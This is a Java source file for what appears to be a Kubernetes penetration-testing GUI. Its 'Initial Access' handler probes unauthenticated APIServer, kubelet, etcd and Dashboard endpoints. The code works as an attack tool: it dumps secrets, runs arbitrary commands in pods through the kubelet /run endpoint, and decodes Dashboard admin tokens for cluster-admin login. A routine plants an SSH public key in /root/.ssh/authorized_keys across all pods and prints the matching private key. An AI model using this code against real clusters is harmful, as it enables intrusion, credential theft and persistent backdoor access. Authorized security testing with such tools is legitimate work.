package com.k8spen.tool.controller;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.k8spen.tool.utils.K8sHttpUtil;
import com.k8spen.tool.utils.K8sJsonRenderer;
import javafx.concurrent.Task;
import javafx.scene.control.*;
import javafx.stage.FileChooser;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 1. Initial Access - APIServer / Kubelet / Etcd / Dashboard / Kubeconfig
 */
public class AccessHandler {

    private static final Logger LOGGER = LoggerFactory.getLogger(AccessHandler.class);

    private final ControllerContext ctx;

    // APIServer
    private String apiBaseUrl = null;
    private final TextField customApiPath;
    private final ComboBox<String> apiMethodOpt;
    private final TextArea kubectlCmdHint;
    private final TextArea apiServerOutput;

    // Kubelet
    private final TextField kubeletNs, kubeletPod, kubeletContainer, kubeletCmd;
    private final TextArea kubeletOutput;

    // Etcd
    private final ComboBox<String> etcdVersionOpt;
    private final TextField etcdPort, etcdKeyInput;
    private final TextArea etcdCmdHint, etcdOutput;

    // Dashboard
    private final TextField dashboardPort;
    private final CheckBox dashboardHttps;
    private final TextArea dashboardOutput;

    // Kubeconfig
    private final TextArea kubeconfigContent, kubeconfigOutput;

    // Shared
    private final TabPane mainTabPane;
    private final String defaultSshPubKey, defaultSshPrivKey;

    public AccessHandler(ControllerContext ctx,
                         TextField customApiPath, ComboBox<String> apiMethodOpt,
                         TextArea kubectlCmdHint, TextArea apiServerOutput,
                         TextField kubeletNs, TextField kubeletPod,
                         TextField kubeletContainer, TextField kubeletCmd,
                         TextArea kubeletOutput,
                         ComboBox<String> etcdVersionOpt, TextField etcdPort,
                         TextField etcdKeyInput, TextArea etcdCmdHint, TextArea etcdOutput,
                         TextField dashboardPort, CheckBox dashboardHttps, TextArea dashboardOutput,
                         TextArea kubeconfigContent, TextArea kubeconfigOutput,
                         TabPane mainTabPane,
                         String defaultSshPubKey, String defaultSshPrivKey) {
        this.ctx = ctx;
        this.customApiPath = customApiPath; this.apiMethodOpt = apiMethodOpt;
        this.kubectlCmdHint = kubectlCmdHint; this.apiServerOutput = apiServerOutput;
        this.kubeletNs = kubeletNs; this.kubeletPod = kubeletPod;
        this.kubeletContainer = kubeletContainer; this.kubeletCmd = kubeletCmd;
        this.kubeletOutput = kubeletOutput;
        this.etcdVersionOpt = etcdVersionOpt; this.etcdPort = etcdPort;
        this.etcdKeyInput = etcdKeyInput; this.etcdCmdHint = etcdCmdHint; this.etcdOutput = etcdOutput;
        this.dashboardPort = dashboardPort; this.dashboardHttps = dashboardHttps;
        this.dashboardOutput = dashboardOutput;
        this.kubeconfigContent = kubeconfigContent; this.kubeconfigOutput = kubeconfigOutput;
        this.mainTabPane = mainTabPane;
        this.defaultSshPubKey = defaultSshPubKey; this.defaultSshPrivKey = defaultSshPrivKey;
    }

    public String getApiBaseUrl() { return apiBaseUrl; }

    // ================ APIServer ================

    public void checkInsecurePort() {
        String host = ctx.getHost(); if (host == null) return;
        apiBaseUrl = "http://" + host + ":8080";
        ctx.log("[*] Switched to insecure port: " + apiBaseUrl);
        String url = apiBaseUrl + "/";
        String hint = "# Current: " + apiBaseUrl + "\n"
                + "# Equivalent kubectl commands:\n"
                + "kubectl -s http://" + host + ":8080 get nodes\n"
                + "kubectl -s http://" + host + ":8080 get pods --all-namespaces\n"
                + "kubectl -s http://" + host + ":8080 get secrets --all-namespaces";
        ctx.asyncGet(url, apiServerOutput, hint, kubectlCmdHint);
    }

    public void checkSecurePort() {
        String host = ctx.getHost(); if (host == null) return;
        apiBaseUrl = "https://" + host + ":6443";
        ctx.log("[*] Switched to secure port: " + apiBaseUrl);
        String url = apiBaseUrl + "/";
        String hint = "# Current: " + apiBaseUrl + "\n"
                + "# Equivalent kubectl commands:\n"
                + "kubectl -s https://" + host + ":6443 --insecure-skip-tls-verify=true get nodes\n"
                + "# If API list is returned instead of 403, anonymous unauthorized access exists";
        ctx.asyncGet(url, apiServerOutput, hint, kubectlCmdHint);
    }

    public void getNodes() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/nodes"), apiServerOutput,
                "# Equivalent command:\nkubectl get nodes -o json", kubectlCmdHint);
    }

    public void getPods() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/pods"), apiServerOutput,
                "# Equivalent command:\nkubectl get pods --all-namespaces -o json", kubectlCmdHint);
    }

    public void getSecrets() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.asyncGet(buildApiUrl(host, "/api/v1/namespaces/default/secrets"), apiServerOutput,
                "# Equivalent command:\nkubectl get secrets -n default -o json\n\n# Decode token after obtaining:\necho '<token_base64>' | base64 -d",
                kubectlCmdHint);
    }

    public void checkAuth() {
        String host = ctx.getHost(); if (host == null) return;
        String url = buildApiUrl(host, "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews");
        String body = "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\","
                + "\"spec\":{\"namespace\":\"default\"}}";
        if (kubectlCmdHint != null) kubectlCmdHint.setText("# Equivalent command:\nkubectl auth can-i --list");
        ctx.asyncPost(url, body, "application/json", apiServerOutput);
    }

    public void sendCustomApi() {
        String host = ctx.getHost(); if (host == null) return;
        String path = customApiPath.getText().trim();
        if (path.isEmpty()) { apiServerOutput.setText("[-] Please enter API path"); return; }
        if (!path.startsWith("/")) path = "/" + path;
        String url = buildApiUrl(host, path);
        String method = apiMethodOpt.getValue();

        if ("GET".equals(method) || "DELETE".equals(method)) {
            ctx.setStatus("Requesting: " + url);
            apiServerOutput.setText("Requesting...\n");
            ctx.log("[*] " + method + " " + url);
            String finalUrl = url;
            Task<String> task = new Task<>() {
                @Override protected String call() throws Exception {
                    return K8sHttpUtil.sendRequest(finalUrl, method, ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls());
                }
            };
            task.setOnSucceeded(e -> {
                apiServerOutput.setText(K8sJsonRenderer.render(task.getValue()));
                ctx.setStatus("Request completed");
            });
            task.setOnFailed(e -> apiServerOutput.setText("[-] Request failed: " + task.getException().getMessage()));
            ControllerContext.execute(task);
        } else {
            ctx.asyncPost(url, "{}", "application/json", apiServerOutput);
        }
    }

    private String buildApiUrl(String host, String path) {
        if (apiBaseUrl != null && !apiBaseUrl.isEmpty()) return apiBaseUrl + path;
        return "https://" + host + ":6443" + path;
    }

    // ================ Kubelet ================

    public void checkKubelet() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] Detecting kubelet unauthorized access: https://" + host + ":10250/pods");
        ctx.asyncGet("https://" + host + ":10250/pods", kubeletOutput);
    }

    public void kubeletListPods() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.log("[*] Listing pods managed by kubelet");
        ctx.asyncGet("https://" + host + ":10250/pods", kubeletOutput);
    }

    public void kubeletExecCmd() {
        String host = ctx.getHost(); if (host == null) return;
        String ns = kubeletNs.getText().trim();
        String pod = kubeletPod.getText().trim();
        String container = kubeletContainer.getText().trim();
        String cmd = kubeletCmd.getText().trim();
        if (pod.isEmpty() || container.isEmpty() || cmd.isEmpty()) {
            kubeletOutput.setText("[-] Please fill in Pod name, container name, and command"); return;
        }
        String url = "https://" + host + ":10250/run/" + ns + "/" + pod + "/" + container;
        ctx.log("[*] kubelet exec command: " + cmd + " on " + ns + "/" + pod + "/" + container);
        ctx.asyncPost(url, "cmd=" + cmd, "application/x-www-form-urlencoded", kubeletOutput);
    }

    public void kubeletInjectSSHKey() {
        String host = ctx.getHost(); if (host == null) return;
        kubeletOutput.setText("[*] Scanning all Pods for containers with port 22 open...\n\n");
        ctx.log("[*] Scanning Pod SSH ports and injecting keys");

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder result = new StringBuilder();
                String contentType = "application/x-www-form-urlencoded";
                String podsJson = K8sHttpUtil.sendRequest("https://" + host + ":10250/pods", "GET", null, ctx.getTimeout(), ctx.isSkipTls());
                if (podsJson.contains("401") || podsJson.contains("403"))
                    return "[-] Kubelet unauthorized access failed, please check port 10250 first";
                String json = podsJson;
                int nl = podsJson.indexOf('\n');
                if (nl > 0 && podsJson.startsWith("[HTTP")) json = podsJson.substring(nl + 1).trim();
                JsonObject root = JsonParser.parseString(json).getAsJsonObject();
                JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
                result.append(String.format("[*] Found %d Pods, checking port 22 one by one...\n\n", items.size()));
                int injected = 0;
                for (int i = 0; i < items.size(); i++) {
                    JsonObject pod = items.get(i).getAsJsonObject();
                    JsonObject meta = pod.has("metadata") ? pod.getAsJsonObject("metadata") : new JsonObject();
                    JsonObject spec = pod.has("spec") ? pod.getAsJsonObject("spec") : new JsonObject();
                    JsonObject status = pod.has("status") ? pod.getAsJsonObject("status") : new JsonObject();
                    String podName = meta.has("name") ? meta.get("name").getAsString() : "";
                    String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "";
                    String podIp = status.has("podIP") ? status.get("podIP").getAsString() : "";
                    JsonArray containers = spec.has("containers") ? spec.getAsJsonArray("containers") : new JsonArray();
                    if (containers.size() == 0) continue;
                    String containerName = containers.get(0).getAsJsonObject().get("name").getAsString();
                    String baseUrl = "https://" + host + ":10250/run/" + ns + "/" + podName + "/" + containerName;
                    String checkResult = K8sHttpUtil.sendPost(baseUrl, "cmd=cat /etc/ssh/sshd_config 2>/dev/null && echo SSH_FOUND || echo SSH_NOT_FOUND", contentType, null, ctx.getTimeout(), ctx.isSkipTls());
                    if (!checkResult.contains("SSH_FOUND")) {
                        result.append(String.format("  [%d] %s/%s (%s) - No SSH service, skipping\n", i + 1, ns, podName, podIp));
                        continue;
                    }
                    result.append(String.format("  [%d] %s/%s (%s) - SSH service found!\n", i + 1, ns, podName, podIp));
                    String writeCmd = "cmd=mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '" + defaultSshPubKey + "' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo PUBKEY_OK";
                    String writeResult = K8sHttpUtil.sendPost(baseUrl, writeCmd, contentType, null, ctx.getTimeout(), ctx.isSkipTls());
                    if (writeResult.contains("PUBKEY_OK")) {
                        result.append("    [+] Public key written successfully: /root/.ssh/authorized_keys\n");
                        K8sHttpUtil.sendPost(baseUrl, "cmd=/usr/sbin/sshd 2>/dev/null; echo done", contentType, null, ctx.getTimeout(), ctx.isSkipTls());
                        result.append("    [+] Attempted to start sshd\n");
                        result.append("    [+] SSH connection: ssh -i id_rsa root@").append(podIp).append("\n");
                        injected++;
                    } else {
                        result.append("    [-] Write failed: ").append(writeResult.replaceAll("\\[HTTP \\d+\\]", "").trim()).append("\n");
                    }
                    result.append("\n");
                }
                result.append("=".repeat(60)).append("\n");
                result.append(String.format("Done! Successfully injected %d containers\n\n", injected));
                if (injected > 0) {
                    result.append("[Connection Method]\n  1. Save the private key below to a local file named id_rsa\n  2. chmod 600 id_rsa\n  3. ssh -i id_rsa root@<container_ip>\n\n");
                    result.append("[Private Key Content] (copy and save as id_rsa)\n").append(defaultSshPrivKey).append("\n");
                } else {
                    result.append("[-] No containers with SSH service found\n");
                }
                return result.toString();
            }
        };
        task.setOnSucceeded(e -> { kubeletOutput.setText(task.getValue()); ctx.setStatus("SSH key injection completed"); ctx.log("[+] SSH key injection completed"); });
        task.setOnFailed(e -> { kubeletOutput.setText("[-] SSH key injection failed: " + task.getException().getMessage()); ctx.log("[-] SSH key injection failed"); });
        ControllerContext.execute(task);
    }

    // ================ Etcd ================

    private String getEtcdPort() {
        String p = etcdPort != null ? etcdPort.getText().trim() : "";
        return p.isEmpty() ? "2379" : p;
    }

    public void checkEtcd() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            String url = "http://" + host + ":" + ep + "/v2/keys/";
            ctx.asyncGet(url, etcdOutput, "# etcd v2 equivalent command:\ncurl http://" + host + ":" + ep + "/v2/keys/?recursive=true\n\n# Check version:\ncurl http://" + host + ":" + ep + "/version", etcdCmdHint);
        } else {
            String url = "http://" + host + ":" + ep + "/v3/kv/range";
            if (etcdCmdHint != null) etcdCmdHint.setText("# etcd v3 equivalent command:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only\n\n# Search secrets:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only | grep secrets");
            ctx.asyncPost(url, "{\"key\":\"AA==\",\"range_end\":\"AA==\",\"limit\":\"10\"}", "application/json", etcdOutput);
        }
    }

    public void etcdGetKeys() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys/?recursive=true", etcdOutput);
        } else {
            String keyBase64 = Base64.getEncoder().encodeToString("/".getBytes());
            String rangeEndBase64 = Base64.getEncoder().encodeToString("0".getBytes());
            if (etcdCmdHint != null) etcdCmdHint.setText("# Equivalent command:\netcdctl --endpoints=http://" + host + ":" + ep + " get / --prefix --keys-only");
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + keyBase64 + "\",\"range_end\":\"" + rangeEndBase64 + "\",\"keys_only\":true}", "application/json", etcdOutput);
        }
    }

    public void etcdSearchSecrets() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys/registry/secrets/?recursive=true", etcdOutput);
        } else {
            String key = "/registry/secrets/"; String rangeEnd = "/registry/secrets0";
            if (etcdCmdHint != null) etcdCmdHint.setText("# Equivalent command:\netcdctl --endpoints=http://" + host + ":" + ep + " get /registry/secrets/ --prefix");
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + Base64.getEncoder().encodeToString(key.getBytes()) + "\",\"range_end\":\"" + Base64.getEncoder().encodeToString(rangeEnd.getBytes()) + "\"}", "application/json", etcdOutput);
        }
    }

    public void etcdReadKey() {
        String host = ctx.getHost(); if (host == null) return;
        String ep = getEtcdPort(); String key = etcdKeyInput.getText().trim();
        if (key.isEmpty()) { etcdOutput.setText("[-] Please enter the Key to read"); return; }
        String version = etcdVersionOpt.getValue();
        if ("v2".equals(version)) {
            ctx.asyncGet("http://" + host + ":" + ep + "/v2/keys" + (key.startsWith("/") ? key : "/" + key), etcdOutput);
        } else {
            ctx.asyncPost("http://" + host + ":" + ep + "/v3/kv/range", "{\"key\":\"" + Base64.getEncoder().encodeToString(key.getBytes()) + "\"}", "application/json", etcdOutput);
        }
    }

    // ================ Dashboard ================

    public void checkDashboard() {
        String host = ctx.getHost(); if (host == null) return;
        String port = dashboardPort.getText().trim();
        boolean https = dashboardHttps.isSelected();
        String scheme = https ? "https" : "http";
        dashboardOutput.setText("[*] Detecting Dashboard...\n\n");
        ctx.log("[*] Detecting Dashboard: " + host + ":" + port);

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                StringBuilder sb = new StringBuilder();
                String baseUrl = scheme + "://" + host + ":" + port;
                boolean open = K8sHttpUtil.isPortOpen(host, Integer.parseInt(port), 3);
                sb.append("[1] Port detection: ").append(host).append(":").append(port).append(open ? " [OPEN]\n" : " [CLOSED]\n");
                if (!open) { sb.append("[-] Port is closed, Dashboard not deployed or port incorrect\n"); return sb.toString(); }
                sb.append("\n[2] Dashboard fingerprint detection:\n");
                String indexResult = "";
                try {
                    indexResult = K8sHttpUtil.sendRequest(baseUrl + "/", "GET", null, 5, ctx.isSkipTls());
                    if (indexResult.contains("dashboard") || indexResult.contains("kubernetes-dashboard") || indexResult.contains("ng-app"))
                        sb.append("  [+] Confirmed as K8s Dashboard!\n");
                    else if (indexResult.contains("200")) sb.append("  [?] Port responded, might be Dashboard\n");
                    else sb.append("  [-] Dashboard fingerprint not found in response\n");
                } catch (Exception e) { sb.append("  [-] Request failed: ").append(e.getMessage()).append("\n"); }
                sb.append("\n[3] Unauthorized access detection:\n");
                try {
                    String apiCheck = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/namespaces", "GET", null, 5, ctx.isSkipTls());
                    if (apiCheck.contains("200") && apiCheck.contains("items")) sb.append("  Warning: API accessible without auth, Dashboard has unauthorized access risk!\n");
                    else if (apiCheck.contains("403") || apiCheck.contains("401")) sb.append("  [*] API requires authentication, checking if login can be skipped...\n");
                } catch (Exception e) { sb.append("  [*] Cannot directly access API\n"); }
                try {
                    String csrfCheck = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/csrftoken/login", "GET", null, 5, ctx.isSkipTls());
                    if (csrfCheck.contains("200") && csrfCheck.contains("token")) sb.append("  Warning: Login interface accessible, might support skip login!\n");
                } catch (Exception e) { LOGGER.error("CSRF token check failed", e); }
                sb.append("\n[4] Version info:\n");
                try {
                    String sysInfo = K8sHttpUtil.sendRequest(baseUrl + "/api/v1/systembanner", "GET", null, 5, ctx.isSkipTls());
                    if (sysInfo.contains("200")) sb.append("  ").append(sysInfo.replaceAll("\\[HTTP \\d+\\]\\n?", "").trim()).append("\n");
                } catch (Exception e) { LOGGER.error("System banner check failed", e); }
                if (indexResult.contains("v2.")) {
                    int vi = indexResult.indexOf("v2.");
                    sb.append("  Dashboard version: ").append(indexResult.substring(vi, Math.min(vi + 10, indexResult.length())).split("[^v0-9.]")[0]).append("\n");
                } else sb.append("  No version info detected\n");
                sb.append("\n[5] Get Dashboard Admin Token:\n");
                if (apiBaseUrl != null) {
                    try {
                        String secretsJson = K8sHttpUtil.sendRequest(apiBaseUrl + "/api/v1/namespaces/kubernetes-dashboard/secrets", "GET", ctx.getToken(), ctx.getTimeout(), ctx.isSkipTls());
                        if (secretsJson.contains("200") && secretsJson.contains("token")) {
                            String j = secretsJson.substring(secretsJson.indexOf('\n') + 1).trim();
                            JsonObject r = JsonParser.parseString(j).getAsJsonObject();
                            JsonArray items = r.has("items") ? r.getAsJsonArray("items") : new JsonArray();
                            for (int i = 0; i < items.size(); i++) {
                                JsonObject secret = items.get(i).getAsJsonObject();
                                String name = secret.has("metadata") ? secret.getAsJsonObject("metadata").get("name").getAsString() : "";
                                String type = secret.has("type") ? secret.get("type").getAsString() : "";
                                if (type.contains("service-account-token") && (name.contains("admin") || name.contains("dashboard"))) {
                                    JsonObject data = secret.has("data") ? secret.getAsJsonObject("data") : new JsonObject();
                                    if (data.has("token")) {
                                        String decoded = new String(Base64.getDecoder().decode(data.get("token").getAsString()));
                                        sb.append("  Key found Token (").append(name).append("):\n  ").append(decoded).append("\n\n  -> Use this Token to log in to Dashboard and obtain cluster-admin privileges\n");
                                    }
                                }
                            }
                        } else sb.append("  [-] Unable to get Secrets via APIServer\n");
                    } catch (Exception e) { sb.append("  [-] Failed to get: ").append(e.getMessage()).append("\n"); }
                } else sb.append("  [-] Please check APIServer unauthorized access tab first\n");
                sb.append("\n").append("=".repeat(60)).append("\n[Exploitation Method]\n  1. Browser access: ").append(baseUrl).append("\n  2. If skip login is available -> click \"Skip\" to enter directly\n  3. If Token is required -> use the Token obtained above to log in\n  4. After login, you can view all Namespace resources, execute container commands, and view Secrets\n");
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { dashboardOutput.setText(task.getValue()); ctx.setStatus("Dashboard detection completed"); ctx.log("[+] Dashboard detection completed"); });
        task.setOnFailed(e -> { dashboardOutput.setText("[-] Detection failed: " + task.getException().getMessage()); ctx.setStatus("Detection failed"); });
        ControllerContext.execute(task);
    }

    public void checkDashboardHttps() {
        String host = ctx.getHost(); if (host == null) return;
        ctx.setStatus("Scanning common Dashboard ports...");
        dashboardOutput.setText("[*] Scanning common Dashboard ports...\n\n");
        Task<String> task = new Task<>() {
            @Override protected String call() {
                StringBuilder sb = new StringBuilder();
                int[] ports = {443, 8443, 8001, 9090, 30000, 30443, 31000, 32000};
                int found = 0;
                for (int port : ports) {
                    boolean open = K8sHttpUtil.isPortOpen(host, port, 2);
                    if (open) {
                        sb.append(String.format("  [OK] %-8d [OPEN]", port)); found++;
                        try { String r = K8sHttpUtil.sendRequest("https://" + host + ":" + port + "/", "GET", null, 3, ctx.isSkipTls());
                            if (r.contains("dashboard") || r.contains("kubernetes")) sb.append(" <- Dashboard found!");
                        } catch (Exception e) {
                            try { String r = K8sHttpUtil.sendRequest("http://" + host + ":" + port + "/", "GET", null, 3, ctx.isSkipTls());
                                if (r.contains("dashboard") || r.contains("kubernetes")) sb.append(" <- Dashboard found! (HTTP)");
                            } catch (Exception ex) { LOGGER.error("Port check failed for port " + port, ex); }
                        }
                        sb.append("\n");
                    } else sb.append(String.format("  [X]  %-8d [CLOSED]\n", port));
                }
                sb.append(String.format("\nScan completed: %d/%d ports open\n", found, ports.length));
                if (found > 0) sb.append("Tip: Fill the open port into the port field above and click \"Detect Dashboard\" for detailed detection");
                return sb.toString();
            }
        };
        task.setOnSucceeded(e -> { dashboardOutput.setText(task.getValue()); ctx.setStatus("Port scan completed"); });
        task.setOnFailed(e -> dashboardOutput.setText("[-] Scan failed: " + task.getException().getMessage()));
        ControllerContext.execute(task);
    }

    public void openDashboardInBrowser() {
        String host = ctx.getHost(); if (host == null) return;
        String port = dashboardPort.getText().trim();
        boolean https = dashboardHttps.isSelected();
        String url = (https ? "https" : "http") + "://" + host + ":" + port + "/";
        try { java.awt.Desktop.getDesktop().browse(new java.net.URI(url)); ctx.log("[+] Opened in browser: " + url);
        } catch (Exception e) { ctx.log("[-] Failed to open browser: " + e.getMessage()); dashboardOutput.setText("[-] Failed to open browser: " + e.getMessage() + "\nPlease manually visit: " + url); }
    }

    // ================ Kubeconfig ================

    public void loadKubeconfig() {
        FileChooser fc = new FileChooser();
        fc.setTitle("Select Kubeconfig file");
        fc.getExtensionFilters().addAll(new FileChooser.ExtensionFilter("All files", "*.*"), new FileChooser.ExtensionFilter("YAML files", "*.yaml", "*.yml"), new FileChooser.ExtensionFilter("Config files", "config", "*.conf"));
        File file = fc.showOpenDialog(mainTabPane.getScene().getWindow());
        if (file != null) {
            try { kubeconfigContent.setText(new String(Files.readAllBytes(file.toPath()), "UTF-8")); ctx.log("[+] Kubeconfig file loaded: " + file.getAbsolutePath());
            } catch (Exception e) { ctx.log("[-] Failed to read file: " + e.getMessage()); }
        }
    }

    public void parseKubeconfig() {
        String content = kubeconfigContent.getText().trim();
        if (content.isEmpty()) { kubeconfigOutput.setText("[-] Please load or paste Kubeconfig content first"); return; }
        StringBuilder sb = new StringBuilder("# ======== Kubeconfig Parse Result ========\n\n");
        Pattern sp = Pattern.compile("server:\\s*(\\S+)");
        Matcher sm = sp.matcher(content);
        while (sm.find()) sb.append("[*] API Server: ").append(sm.group(1)).append("\n");
        Pattern up = Pattern.compile("name:\\s*(\\S+)");
        Matcher um = up.matcher(content);
        while (um.find()) sb.append("[*] Name: ").append(um.group(1)).append("\n");
        if (content.contains("client-certificate-data:")) sb.append("\n[+] Client certificate data found (client-certificate-data)\n");
        if (content.contains("client-key-data:")) sb.append("[+] Client key data found (client-key-data)\n");
        if (content.contains("token:")) {
            sb.append("[+] Token credential found\n");
            Pattern tp = Pattern.compile("token:\\s*(\\S+)");
            Matcher tm = tp.matcher(content);
            while (tm.find()) { String t = tm.group(1); sb.append("    Token: ").append(t.substring(0, Math.min(t.length(), 40))).append("...\n"); }
        }
        if (content.contains("certificate-authority-data:")) sb.append("[+] CA certificate data found\n");
        Pattern np = Pattern.compile("namespace:\\s*(\\S+)");
        Matcher nm = np.matcher(content);
        while (nm.find()) sb.append("[*] Namespace: ").append(nm.group(1)).append("\n");
        kubeconfigOutput.setText(sb.toString());
        ctx.log("[+] Kubeconfig parsing completed");
    }

    public void genKubectlCmd() {
        String content = kubeconfigContent.getText().trim();
        if (content.isEmpty()) { kubeconfigOutput.setText("[-] Please load or paste Kubeconfig content first"); return; }
        StringBuilder sb = new StringBuilder("# ======== Generated kubectl Commands ========\n\n");
        Pattern sp = Pattern.compile("server:\\s*(\\S+)");
        Matcher sm = sp.matcher(content);
        String server = sm.find() ? sm.group(1) : "";
        sb.append("# Method 1: Use kubeconfig file directly\nkubectl --kubeconfig=./config get nodes\nkubectl --kubeconfig=./config get pods --all-namespaces\nkubectl --kubeconfig=./config get secrets --all-namespaces\n\n");
        if (content.contains("token:")) {
            Pattern tp = Pattern.compile("token:\\s*(\\S+)");
            Matcher tm = tp.matcher(content);
            if (tm.find()) sb.append("# Method 2: Access directly with token\nkubectl --server=").append(server).append(" --token=").append(tm.group(1)).append(" --insecure-skip-tls-verify=true get nodes\n\n");
        }
        sb.append("# Method 3: Set KUBECONFIG environment variable\nexport KUBECONFIG=./config\nkubectl get nodes\n\n");
        if (!server.isEmpty()) sb.append("# Current server address: ").append(server).append("\n");
        kubeconfigOutput.setText(sb.toString());
        ctx.log("[+] kubectl command generation completed");
    }
}
